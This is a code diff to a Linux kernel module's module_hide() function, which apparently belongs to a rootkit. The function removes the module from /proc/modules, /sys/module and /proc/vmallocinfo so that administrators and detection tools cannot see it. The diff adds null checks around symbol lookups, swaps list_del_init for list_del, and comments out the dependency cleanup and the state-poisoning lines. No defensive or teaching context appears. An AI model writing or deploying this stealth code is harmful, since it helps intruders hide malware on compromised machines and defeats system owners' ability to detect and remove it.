@@ -209,9 +209,19 @@ void module_hide(void) {
     unregister_kprobe(&kp);
 #endif
 
+    if(!kallsyms_lookup_name) {
+	pr_info("[+] kallsyms_lookup not found");
+	return;
+    }
+
     _vmap_area_list =
         (struct list_head *) kallsyms_lookup_name("vmap_area_list");
     _vmap_area_root = (struct rb_root *) kallsyms_lookup_name("vmap_area_root");
+
+   if(!_vmap_area_list | !_vmap_area_root) {
+	pr_info("[+] vmap noobs not found");
+	return;
+   }
 
     /* hidden from /proc/vmallocinfo */
     list_for_each_entry_safe (va, vtmp, _vmap_area_list, list) {
@@ -224,13 +234,13 @@ void module_hide(void) {
     }
 
     // Remove from /proc/modules
-    // list_del(&THIS_MODULE->list);
-    list_del_init(&THIS_MODULE->list);
+    list_del(&THIS_MODULE->list);
+    // list_del_init(&THIS_MODULE->list);
 
     // Remove from /sys/module
     kobject_del(&THIS_MODULE->mkobj.kobj);
 
-    /* decouple the dependency */
+    /* decouple the dependency 
     list_for_each_entry_safe (use, tmp, &THIS_MODULE->target_list,
                               target_list) {
         list_del(&use->source_list);
@@ -238,9 +248,9 @@ void module_hide(void) {
         sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
         kfree(use);
     }
-    
-    THIS_MODULE->list.prev = (struct list_head *)0xDEAD000000000122LL;
-    THIS_MODULE->state = MODULE_STATE_UNFORMED; // Change state to prevent loading
+    */
+    // THIS_MODULE->list.prev = (struct list_head *)0xDEAD000000000122LL;
+    // THIS_MODULE->state = MODULE_STATE_UNFORMED; // Change state to prevent loading
 	
     THIS_MODULE->sect_attrs = NULL;
     THIS_MODULE->notes_attrs = NULL;
